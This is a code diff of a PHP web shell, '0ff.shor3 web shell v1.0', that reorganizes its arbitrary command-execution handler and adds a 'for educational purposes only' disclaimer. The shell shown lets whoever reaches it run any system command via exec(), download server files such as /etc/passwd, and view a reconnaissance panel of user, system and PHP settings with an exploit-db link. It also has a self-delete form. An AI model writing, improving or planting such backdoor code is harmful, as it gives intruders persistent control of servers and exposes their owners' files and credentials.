@@ -49,24 +49,6 @@ if (isset($_POST["download"]))
 	}
 }
 
-if (isset($_POST["exec"]))
-{
-	$command = $_POST["exec"];
-
-	$output = null;
-	$result_code = null;
-
-	$result = exec($command, $output, $result_code);
-
-	?>
-<pre name="terminal">
-<?
-echo(($result == FALSE) ? "Command not found..." : implode("\n", $output));
-?>
-</pre>
-	<?
-}
-
 if (isset($_POST["kill"])) { unlink(__FILE__); }
 
 echo( sprintf("
@@ -122,7 +104,7 @@ echo( sprintf("
 ░ ░ ░ ▒   ░ ░    ░ ░     ░   ░  ░  ░   ░  ░░ ░░ ░ ░ ▒    ░░   ░    ░        ░   ░     ░    ░    ░    ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
     ░ ░                   ░        ░   ░  ░  ░    ░ ░     ░        ░  ░       ░       ░  ░ ░               ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
 
-0ff.shor3 web shell v1.0 dev: @sug4r-wr41th
+0ff.shor3 web shell v1.0 | dev: @sug4r-wr41th | Fair Use disclaimer: for educational purposes only.
 </pre>
 
 	<script>
@@ -145,7 +127,7 @@ echo( sprintf("
 		<tr><td>User</td><td>%s</td></tr>
 		<tr><td>Group</td><td>%s</td></tr>
 		<tr><td>System</td><td>%s</td></tr>
-		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b></td></tr>
+		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> <a href='https://www.php.net/manual/en/ini.core.php#ini.disable-functions' target='_blank'>[php.net]</a></td></tr>
 		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
 		<tr><td>Current Directory</td><td>%s</td></tr>
 		<tr><td>Free / Total disk space</td><td>%sGB / %sGB</td></tr>
@@ -159,7 +141,7 @@ echo( sprintf("
 	sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(posix_getgid())["name"]),
 	implode(" ", posix_uname()),
 	PHP_VERSION . " <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[exploit-db]</a>",
-	((int) ini_get("SAFE_MODE")) ? "ON": "OFF",
+	((int) ini_get("safe_mode")) ? "ON": "OFF",
 	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
 	error_reporting(),
 	ini_get("disable_functions") == "" ? "none" : ini_get("disable_functions"),
@@ -180,22 +162,42 @@ echo( sprintf("
 );
 ?>
 
-<form action="<? echo($shell . "?pwd=" . $pwd); ?>" method="POST">
+<form action="<? echo($shell); ?>" method="POST">
 	<label for="exec">File:</label><br>
 	<input type="text" id="download" name="download" placeholder="/etc/passwd">
 	<input type="submit" value="Download">
 </form>
 
-<form action="<? echo($shell . "?pwd=" . $pwd); ?>" method="POST">
+<form action="<? echo($shell); ?>" method="POST">
 	<label for="exec">Command:</label><br>
 	<input type="text" id="exec" name="exec" placeholder="ls -ls">
 	<input type="submit" value="Execute">
 </form>
 
-<form action="<? echo($shell . "?pwd=" . $pwd); ?>" method="POST">
+<form action="<? echo($shell); ?>" method="POST">
 	<input type="hidden" id="kill" name="kill">
 	<input type="submit" value="Remove Shell">
 	<b>Warning!</b> You'll forever lose access to the shell. This action can't be undone.
 </form>
+
+<?php
+if (isset($_POST["exec"]))
+{
+	$command = $_POST["exec"];
+
+	$output = null;
+	$result_code = null;
+
+	$result = exec($command, $output, $result_code);
+
+	?>
+<pre name="terminal">
+<?
+echo(($result == FALSE) ? "Command not found..." : implode("\n", $output));
+?>
+</pre>
+	<?
+}
+?>
 
 </body></html>
